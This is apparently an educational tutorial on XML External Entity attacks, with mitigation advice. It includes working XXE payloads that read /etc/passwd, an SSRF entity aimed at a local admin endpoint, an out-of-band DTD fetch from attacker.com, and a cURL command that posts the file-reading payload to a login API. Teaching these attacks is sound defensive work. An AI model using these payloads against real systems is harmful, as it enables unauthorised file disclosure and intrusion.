# XML External Entity (XXE)

An XML External Entity (XXE) attack is a security vulnerability that targets applications
processing XML input. This attack leverages the behavior of XML parsers that support
external entities, which are references to external or internal resources defined in the XML data.

XXE attacks can be used to:

- Access sensitive files on the server (e.g., `/etc/passwd`).
- Perform server-side request forgery (SSRF) to interact with internal systems.
- Execute denial-of-service (DoS) attacks by causing resource exhaustion.
- Exfiltrate sensitive data or compromise the application's security.

To mitigate XXE attacks, consider:

- Disabling external entity processing in XML parsers.
- Using secure libraries or parsers that do not support external entities by default.
- Validating and sanitizing XML input to prevent malicious payloads.

## How It Works

XML has a feature that allows defining "entities" in a DOCTYPE. These can include external resources such as files or URLs. When an application parses an XML document and the parser is not securely configured, it may:

- Read files on the server.
- Make HTTP requests to internal systems (Server Side Request Forgery - SSRF).
- Leak sensitive data.
- Cause Denial of Service (e.g., via Billion Laughs attack).

## XXE Payload Examples

### 1. File Disclosure

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>
```

### 2. Server-Side Request Forgery (SSRF)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>
<root>
    <data>&xxe;</data>
</root>
```

### 3. Out-of-Band Data Exfiltration

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % ext SYSTEM "http://attacker.com/malicious.dtd">
    %ext;
]>
```

## Exploiting a Vulnerable Login API

### Example Scenario: Login via XML

Some websites allow users to log in by sending XML data to an API. For example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<login>
    <username>admin</username>
    <password>admin123</password>
</login>
```

If the server uses an XML parser that is vulnerable to XXE, an attacker can exploit this to read sensitive files or perform other malicious actions.

### Step-by-Step: XXE Attack to Read a File

To exploit the vulnerability and read a sensitive file (e.g., `/etc/passwd`), the attacker can modify the XML input as follows:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<login>
    <username>&xxe;</username>
    <password>any</password>
</login>
```

### Explanation of the Attack

1. `<!DOCTYPE foo [...]>`: Declares a Document Type Definition (DTD).
2. `<!ENTITY xxe SYSTEM "file:///etc/passwd">`: Defines an external entity that points to the sensitive file.
3. `&xxe;`: Replaces the entity with the contents of the file.

If the server processes this XML and includes the entity, the response might look like this:

```json
{
  "status": "error",
  "username": "root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:user:/home/user:/bin/bash"
}
```

This response reveals the contents of `/etc/passwd`, demonstrating the severity of the vulnerability.

### Mitigation Tips

- Disable DTD processing in the XML parser.
- Use a secure XML library that prevents XXE by default.
- Validate and sanitize all XML inputs.
- Implement strict input validation to reject malicious payloads.
- Use JSON or other safer formats for data exchange when possible.
- Monitor and log unusual activity to detect potential attacks.

## Tools and Techniques Used by Attackers

Hackers often bypass the normal website interface and use specialized tools to exploit vulnerabilities like XXE. Common tools include:

- **Postman**: Used to craft and send custom requests with full control over headers and body.
- **cURL**: A command-line tool to send raw XML payloads directly to the server.
- **Burp Suite**: A powerful tool to intercept, modify, and inject malicious payloads into requests.

### Example: Exploiting XXE with cURL

Attackers can use `cURL` to send a malicious XML payload to a vulnerable server. For example:

```bash
curl -X POST https://vulnerable-site.com/api/login \
    -H "Content-Type: application/xml" \
    -d '<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<login>
    <username>&xxe;</username>
    <password>test</password>
</login>'
```

If the server is vulnerable, it might return the contents of `/etc/passwd` or any file accessible to the server.

### Classic XXE vs. Blind XXE

1. **Classic XXE**: The server includes the data in the HTTP response, allowing the attacker to see it immediately.
2. **Blind XXE**: The server sends the data to an external server controlled by the attacker (e.g., via DNS or HTTP). The attacker monitors their server logs to capture the stolen information.

### Mitigation Strategies

- Use tools like Burp Suite to test your application for XXE vulnerabilities.
- Regularly audit your XML parsers and configurations.
- Implement strict security measures as outlined in the mitigation tips above.

## Key Terms

| Term              | Meaning                                           |
| ----------------- | ------------------------------------------------- |
| **XML**           | Markup language for data storage/transfer.        |
| **DTD**           | Document Type Definition (defines XML structure). |
| **Entity**        | Variable or placeholder in XML.                   |
| **SYSTEM Entity** | External reference (e.g., file or URL).           |
| **SSRF**          | Server-Side Request Forgery.                      |
